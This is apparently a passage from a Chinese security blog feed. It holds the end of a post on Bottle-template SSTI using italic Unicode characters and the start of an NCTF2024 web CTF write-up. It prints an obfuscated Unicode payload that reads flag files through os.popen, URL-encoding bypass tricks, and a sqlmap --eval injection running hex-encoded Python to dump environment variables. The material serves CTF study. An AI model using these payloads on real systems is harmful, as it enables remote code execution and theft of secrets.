class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">env.update(&#123;</span><br><span class="line">            <span class="string">&#x27;_stdout&#x27;</span>: _stdout,</span><br><span class="line">            <span class="string">&#x27;_printlist&#x27;</span>: _stdout.extend,</span><br><span class="line">            <span class="string">&#x27;include&#x27;</span>: functools.partial(<span class="variable language_">self</span>._include, env),</span><br><span class="line">            <span class="string">&#x27;rebase&#x27;</span>: functools.partial(<span class="variable language_">self</span>._rebase, env),</span><br><span class="line">            <span class="string">&#x27;_rebase&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line">            <span class="string">&#x27;_str&#x27;</span>: <span class="variable language_">self</span>._<span class="built_in">str</span>,</span><br><span class="line">            <span class="string">&#x27;_escape&#x27;</span>: <span class="variable language_">self</span>._escape,</span><br><span class="line">            <span class="string">&#x27;get&#x27;</span>: env.get,</span><br><span class="line">            <span class="string">&#x27;setdefault&#x27;</span>: env.setdefault,</span><br><span class="line">            <span class="string">&#x27;defined&#x27;</span>: env.__contains__</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><p>然后我们接着看<code>flush_text</code>，其中有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parts.append(self.process_inline(m.group(1).strip()))</span><br></pre></td></tr></table></figure><p>每一行模板都会经过它，<code>self.process_inline(m.group(1).strip())</code>，我们跟进一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">process_inline</span>(<span class="params">chunk</span>):</span><br><span class="line">    <span class="keyword">if</span> chunk[<span class="number">0</span>] == <span class="string">&#x27;!&#x27;</span>: <span class="keyword">return</span> <span class="string">&#x27;_str(%s)&#x27;</span> % chunk[<span class="number">1</span>:]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;_escape(%s)&#x27;</span> % chunk</span><br></pre></td></tr></table></figure><p>这里我们发现了与转码有关的<code>_escape</code>函数，我们接下来跟进一下 <code>self._escape</code>，发现他在prepare中被定义。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleTemplate</span>(<span class="title class_ inherited__">BaseTemplate</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">prepare</span>(<span class="params">self,</span></span><br><span class="line"><span class="params">                escape_func=html_escape,</span></span><br><span class="line"><span class="params">                noescape=<span class="literal">False</span>,</span></span><br><span class="line"><span class="params">                syntax=<span class="literal">None</span>, **ka</span>):</span><br><span class="line">        <span class="variable language_">self</span>.cache = &#123;&#125;</span><br><span class="line">        enc = <span class="variable language_">self</span>.encoding</span><br><span class="line">        <span class="variable language_">self</span>._<span class="built_in">str</span> = <span class="keyword">lambda</span> x: touni(x, enc)</span><br><span class="line">        <span class="variable language_">self</span>._escape = <span class="keyword">lambda</span> x: escape_func(touni(x, enc))</span><br><span class="line">        <span class="variable language_">self</span>.syntax = syntax</span><br><span class="line">        <span class="keyword">if</span> noescape:</span><br><span class="line">            <span class="variable language_">self</span>._<span class="built_in">str</span>, <span class="variable language_">self</span>._escape = <span class="variable language_">self</span>._escape, <span class="variable language_">self</span>._<span class="built_in">str</span></span><br></pre></td></tr></table></figure><p>还记得每一次进入SimpleTemplate都有一次初始化吗，就是<code>prepare</code>函数这些。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">self._escape = lambda x: escape_func(touni(x, enc))</span><br></pre></td></tr></table></figure><p>我们跟进一下<code>escape_func</code>，发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">escape_func=html_escape</span><br></pre></td></tr></table></figure><p>再跟进一下<code>html_escape</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">html_escape</span>(<span class="params">string</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Escape HTML special characters ``&amp;&lt;&gt;`` and quotes ``&#x27;&quot;``. &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> string.replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;&amp;amp;&#x27;</span>).replace(<span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&amp;lt;&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;&amp;gt;&#x27;</span>)\</span><br><span class="line">                 .replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&amp;quot;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;&amp;#039;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>就是一个防止XSS的HTML编码函数。</p><p>至此我们得出结论：<strong>我们的输入，不论在不在<code>&#123;&#123;&#125;&#125;</code>里，经过唯一的编码检查就是对source的<code>touni()</code>，但是由于全局变量中的unicode在python3下是全体str，这就导致了我们可以输入斜体字符</strong></p><p>这里给出一个斜体字符生成器：<a href="https://exotictext.com/zh-cn/italic/">https://exotictext.com/zh-cn/italic/</a></p><img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408184735562.png" class="" title="This is an example image"><p>这里3.12.2及其之前的python版本如果执行上述命令会报错！</p><img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408185439286.png" class="" title="This is an example image"><p>最后的代码由python的<code>exec()</code>来执行</p><p>假如直接<code>exec()</code>任意code的话，python会把code中当作代码处理的斜体字根据<code>Decomposition</code>转成对应的ASCII字符（当作字符串处理的除外，如此例中，假如whoami或os为斜体，则会无法执行，因为找不到斜体的os库，和斜体的whoami命令），这里<code>os</code>和<code>whoami</code>是当作字符串处理的！</p><p>看到这里，我想起之前ctf一道ssti的题也考到了这种斜体的方法，这里给出一个payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">𝒈𝒆𝒕𝒂𝒕𝒕𝒓(𝒈𝒆𝒕𝒂𝒕𝒕𝒓(__𝒊𝒎𝒑𝒐𝒓𝒕__(𝒈𝒆𝒕𝒂𝒕𝒕𝒓(&#x27;&#x27;,𝒈𝒆𝒕𝒂𝒕𝒕𝒓(&#x27;&#x27;,𝒎𝒂𝒙(𝒅𝒊𝒄𝒕(𝒋𝒐𝒊𝒏=())))(𝒎𝒂𝒑(𝒄𝒉𝒓,[106,111,105,110])))(𝒎𝒂𝒑(𝒄𝒉𝒓,[111, 115]))),𝒈𝒆𝒕𝒂𝒕𝒕𝒓(&#x27;&#x27;,𝒈𝒆𝒕𝒂𝒕𝒕𝒓(&#x27;&#x27;,𝒎𝒂𝒙(𝒅𝒊𝒄𝒕(𝒋𝒐𝒊𝒏=())))(𝒎𝒂𝒑(𝒄𝒉𝒓,[106,111,105,110])))(𝒎𝒂𝒑(𝒄𝒉𝒓,[112,111,112,101,110])))(𝒈𝒆𝒕𝒂𝒕𝒕𝒓(&#x27;&#x27;,𝒈𝒆𝒕𝒂𝒕𝒕𝒓(&#x27;&#x27;,𝒎𝒂𝒙(𝒅𝒊𝒄𝒕(𝒋𝒐𝒊𝒏=())))(𝒎𝒂𝒑(𝒄𝒉𝒓,[106,111,105,110])))(𝒎𝒂𝒑(𝒄𝒉𝒓,[99,97,116,32,47,102,42]))),𝒈𝒆𝒕𝒂𝒕𝒕𝒓(&#x27;&#x27;,𝒈𝒆𝒕𝒂𝒕𝒕𝒓(&#x27;&#x27;,𝒎𝒂𝒙(𝒅𝒊𝒄𝒕(𝒋𝒐𝒊𝒏=())))(𝒎𝒂𝒑(𝒄𝒉𝒓,[106,111,105,110])))(𝒎𝒂𝒑(𝒄𝒉𝒓,[114,101,97,100])))()</span><br></pre></td></tr></table></figure><p>他这个其实是等价于<code>__import__(&#39;os&#39;).popen(&#39;cat /f*&#39;).read()</code></p><img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408190441433.png" class="" title="This is an example image"><p>接下来再说说为什么只有两个字符<code>ª</code> (U+00AA)，<code>º</code> (U+00BA)成功了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Âªbs(-1)&#125;&#125;</span><br><span class="line">127.0.0.1 - - [08/Apr/2025 19:06:12] &quot;GET /attack?payload=&#123;&#123;%C2%AAbs(-1)&#125;&#125; HTTP/1.1&quot; 400 752</span><br></pre></td></tr></table></figure><p>这些特殊字符经过URL编码之后一个字符都必须以两个编码值表示。但是bottle在解析编码值的时候是按照一个编码值对应一个字符进行解析的，那么bottle解析的就是<code>%C2</code>,只要删除掉<code>%C2</code>就能将字符传入后端！</p><p>我们再看看其他的有没有可利用的！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;Âªbs(-Â¹)&#125;&#125;</span><br><span class="line">http://127.0.0.1:5000/attack?payload=&#123;&#123;%C2%AAbs(-%C2%B9)&#125;&#125;</span><br></pre></td></tr></table></figure><p>若把前面的<code>%C2</code>删除，我们传入如下的参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/attack?payload=&#123;&#123;%AAbs(%B9)&#125;&#125;</span><br></pre></td></tr></table></figure><p>服务端回显如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;ªbs(¹)&#125;&#125;</span><br><span class="line">127.0.0.1 - - [08/Apr/2025 19:12:10] &quot;GET /attack?payload=&#123;&#123;%AAbs(%B9)&#125;&#125; HTTP/1.1&quot; 400 750</span><br></pre></td></tr></table></figure><img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408191231182.png" class="" title="This is an example image"><p>那就是不行喽！</p><p>其中只有<code>ª</code> (U+00AA)，<code>º</code> (U+00BA)，<code>¹</code> (U+00B9)，<code>²</code> (U+00B2)，<code>³</code> (U+00B3)有用，其中<code>¹</code> (U+00B9)，<code>²</code> (U+00B2)，<code>³</code> (U+00B3)在<code>exec()</code>时不会被python正确解析。而<code>ª</code> (U+00AA)，<code>º</code> (U+00BA)执行的时候等效于字符<code>a</code>,<code>o</code>，别的字符RCE根本用不上。</p><img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408191406445.png" class="" title="This is an example image"><p>这里稍微总结一下，如果我们是从前端传入的，那么一定会经过url编码，举个例子：</p><p>我们传入的是<code>&#123;&#123;𝒶𝒷𝓈(1)&#125;&#125;</code>，但是后端无法将其解析，前端页面会报错400。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 - - [08/Apr/2025 19:15:16] &quot;GET /attack?payload=&#123;&#123;%F0%9D%92%B6%F0%9D%92%B7%F0%9D%93%88(1)&#125;&#125; HTTP/1.1&quot; 400 779</span><br><span class="line">&#123;&#123;ð¶ð·ð(1)&#125;&#125;</span><br></pre></td></tr></table></figure><p>但是如果我们直接在后端传入<code>𝒶𝒷𝓈(1)</code>，将以下语句直接加入代码中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">return</span> bottle.template(<span class="string">&#x27;&#123;&#123;𝒶𝒷𝓈(-2)&#125;&#125;&#x27;</span>)</span><br><span class="line">    <span class="comment"># payload = bottle.request.query.get(&#x27;payload&#x27;)</span></span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    <span class="comment"># try:</span></span><br><span class="line">    <span class="comment">#     return bottle.template(&#x27;hello &#x27;+payload)</span></span><br><span class="line">    <span class="comment"># except:</span></span><br><span class="line">    <span class="comment">#     bottle.abort(400, &#x27;Invalid payload&#x27;)</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408191732187.png" class="" title="This is an example image"><p>我们访问时前端正常回显！</p><p>再看看<code>ª</code> (U+00AA)，<code>º</code> (U+00BA)，如果我们前端传入，他会以两个编码值表示，而bottle在解析编码值的时候是按照一个编码值对应一个字符进行解析的，所以如果我们直接传入<code>ª</code> (U+00AA)或者<code>º</code> (U+00BA)，那么必然也是会报错的，因此在前端传入时需要将前面的<code>%C2</code>删除后再传入！</p><p>那么如果直接从后端传入呢？看看效果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, World!&#x27;</span></span><br><span class="line"><span class="meta">@bottle.route(<span class="params"><span class="string">&#x27;/attack&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>():</span><br><span class="line">    <span class="keyword">return</span> bottle.template(<span class="string">&#x27;&#123;&#123;ªbs(-1)&#125;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><img src="/2025/04/08/bottle%E6%A1%86%E6%9E%B6%E6%96%9C%E4%BD%93%E5%AD%97%E5%BC%95%E5%8F%91%E7%9A%84ssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/image-20250408192016120.png" class="" title="This is an example image"><p>因此我们所有的问题都聚焦在如何将斜体字符传入template中。</p><p>get（post）传参特殊字符必须进行URL编码的原因，因此我们是无法传入这种斜体字符的。但是假设靶机提供了一种可以不使用URL编码的方式将可控输入传入template（如：上传文件，再渲染文件中的内容形成的SSTI）那就意味着所有的字符可以全部用各种斜体替换（是的，一个ASCII的斜体字符至少4种），那就真的超模了。</p><p>对于任意ASCII字母都至少可以在<a href="https://exotictext.com/zh-cn/italic/%E4%B8%8A%E6%89%BE%E5%88%B0%E5%9B%9B%E7%A7%8D%E5%AF%B9%E5%BA%94%E7%9A%84%E6%96%9C%E4%BD%93%E3%80%82%E5%9C%A8python%E4%B8%AD%E9%83%BD%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E5%BD%93%E6%88%90ASCII%E6%AD%A3%E5%B8%B8%E6%89%A7%E8%A1%8C%E3%80%82%E5%81%87%E8%AE%BE%E6%88%91%E4%BB%AC%E8%83%BD%E6%8A%8A%E8%BF%99%E4%BA%9B%E4%B8%9C%E8%A5%BF%E4%BC%A0%E5%88%B0%E5%90%8E%E7%AB%AF%EF%BC%8C%E4%B8%8D%E4%BC%9A%E8%A7%A6%E5%8F%91%E9%92%88%E5%AF%B9%E8%AF%A5%E5%AD%97%E7%AC%A6%E7%9A%84waf%EF%BC%8Cbottle%E6%B8%B2%E6%9F%93%E5%AE%8C%E6%88%90%E5%90%8E%E5%B0%B1%E4%BC%9A%E7%9B%B4%E6%8E%A5%E8%BF%9B%E5%85%A5exec%EF%BC%8C%E5%8F%AF%E4%BB%A5%E6%AD%A3%E5%B8%B8RCE%E3%80%82">https://exotictext.com/zh-cn/italic/上找到四种对应的斜体。在python中都可以直接当成ASCII正常执行。假设我们能把这些东西传到后端，不会触发针对该字符的waf，bottle渲染完成后就会直接进入exec，可以正常RCE。</a></p><p>参考文章：</p><p>拉蒙特徐宝子</p><p><a href="https://www.cnblogs.com/LAMENTXU/articles/18805019">https://www.cnblogs.com/LAMENTXU/articles/18805019</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2024 web wp</title>
      <link href="/2025/04/07/NCTF2024-web-wp/"/>
      <url>/2025/04/07/NCTF2024-web-wp/</url>
      
        <content type="html"><![CDATA[<h2 id="sqlmap-master"><a href="#sqlmap-master" class="headerlink" title="sqlmap-master"></a>sqlmap-master</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> FileResponse, StreamingResponse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> FileResponse(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">request: Request</span>):</span><br><span class="line">    data = <span class="keyword">await</span> request.json()</span><br><span class="line">    url = data.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;URL is required&quot;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    command = <span class="string">f&#x27;sqlmap -u <span class="subst">&#123;url&#125;</span> --batch --flush-session&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">        process = subprocess.Popen(</span><br><span class="line">            command.split(),</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            shell=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            output = process.stdout.readline()</span><br><span class="line">            <span class="keyword">if</span> output == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> process.poll() <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> output:</span><br><span class="line">                <span class="keyword">yield</span> output</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> StreamingResponse(generate(), media_type=<span class="string">&quot;text/plain&quot;</span>)</span><br></pre></td></tr></table></figure><p>一个sqlmap的利用器，随便输个url发现版本是最新版本1.9.3。</p><p>第一眼我想到的是通过<code>|</code>或者<code>&amp;</code>或者<code>;</code>来进行rce，但是发现shell&#x3D;False，因此这种就不行啦。</p><p>既然是最新版本，我们本地下一个看看help</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324103838909.png" class="" title="This is an example image"><p>发现一个eval参数，执行提供的python代码并在请求之前执行，拿下了。</p><p>由于他有command.split()，我们用十六进制来绕过一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os; print(os.system(&#x27;env&#x27;))</span><br><span class="line">696d706f7274206f733b207072696e74286f732e73797374656d2827656e76272929</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123 --eval=exec(bytes.fromhex(&#x27;696d706f7274206f733b207072696e74286f732e73797374656d2827656e76272929&#x27;))</span><br></pre></td></tr></table></figure><img src="/2025/04/07/NCTF2024-web-wp/image-20250324104000162.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nctf&#123;e93d1ded-9f2a-4c79-8138-8564b43ca847&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-dash"><a href="#ez-dash" class="headerlink" title="ez_dash"></a>ez_dash</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hints: Flag在环境变量中</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__forbidden_path__=[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__wrapped__&#x27;</span>,</span><br><span class="line">               <span class="string">&quot;Optional&quot;</span>,<span class="string">&quot;func&quot;</span>,<span class="string">&quot;render&quot;</span>,</span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    <span class="string">&quot;bottle&quot;</span></span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(<span class="built_in">dir</span>(<span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.post(<span class="params"><span class="string">&#x27;/setValue&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_value</span>():</span><br><span class="line">    name = bottle.request.query.get(<span 